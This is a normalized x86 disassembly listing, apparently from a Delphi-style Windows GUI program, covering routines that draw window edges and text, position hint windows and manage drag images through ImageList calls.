pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43eba6
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43a80c
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43ac60
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43eba6
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403490
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403490
jmp r-xdata
sub_43ec3c
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_438978
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_438978
sub_43ec80
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_438978
sub_43ecd0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_43ed60
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43efc6
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41e1b8
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_42b480
call sub_42b560
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_42b480
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_42ba90
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_43f008
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069f0
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_4372f0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43b858
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_438978
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_439afc
sub_43f074
push ebx
push esi
mov esi edx
call sub_44e0a8
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_40698c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_438978
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_40698c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_438978
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_43f0d8
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_43bc20
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43f110
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43f108
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43f150
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43fa44
mov edx 0x80ffff
mov eax esi
call sub_43794c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41e824
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41e2a0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_43f1bc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43adf8
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bdc0
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43ad90
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_43f228
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43f27e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f285
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ReleaseDC
retn
sub_43f28c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43f325
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41d9b8
mov eax ebx
call sub_439aa4
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4377ac
mov eax [ ebp - 0x14 ]
call sub_404510
push eax
mov eax [ ebx + 0x208 ]
call sub_41e904
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f32c
lea eax [ ebp - 0x14 ]
call sub_404050
retn
sub_43f334
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_43f3a0
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_43f42b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f432
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4377ac
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41e764
mov edx eax
add edx 0x6
mov eax esi
call sub_436f68
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4377ac
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41e780
mov edx eax
add edx 0x4
mov eax esi
call sub_436f8c
sub_43f438
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_43f611
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4377dc
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_438a1c
mov eax [ esi ]
call sub_4548e0
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4548ec
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_4548e0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_4548d4
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_4548ec
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_4548c8
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_4548d4
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_4548c8
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_43b6a0
push 0x4
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f618
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404310
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_44268c
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call [ rw-data ]
sub_43f620
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43f648
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_412d08
mov eax esi
call sub_439aa4
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404510
push eax
mov eax [ esi + 0x208 ]
call sub_41e904
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43f6a4
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_412d08
call sub_42b480
call sub_42b560
test al al
jne r-xdata
call sub_42b480
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42b704
push esp
push 0x1
push 0xf
push 0x0
call sub_42b480
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42b5d0
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_43f710
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_43bfa8
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_43f734
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43f774
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43f834
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454db4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423628
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454db4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423628
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_43f840
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_44454c
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_43f8a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_444410
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_43f774
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_43f900
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_43f840
push 0x0
call ShowCursor
sub_43f900
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_444410
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_43f964
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43f734
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43f964
push ebx
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_43f988
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_444410
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_43f734
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43f9fc
push ebx
push esi
mov esi eax
mov eax esi
call sub_444410
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_43f964
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_43f888
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_43fa44
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_439c98
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e2d4
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_436388
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_43faa0
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_439dbc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_43faf0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41e5d8
xor eax eax
push ebp
push sub_43fb8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41e984
xor eax eax
push ebp
push sub_43fb6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4363a0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fb72
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41e984
retn
sub_43fba0
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43fc34
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_43fbbc
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43fc34
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_44022c
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_43fc34
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
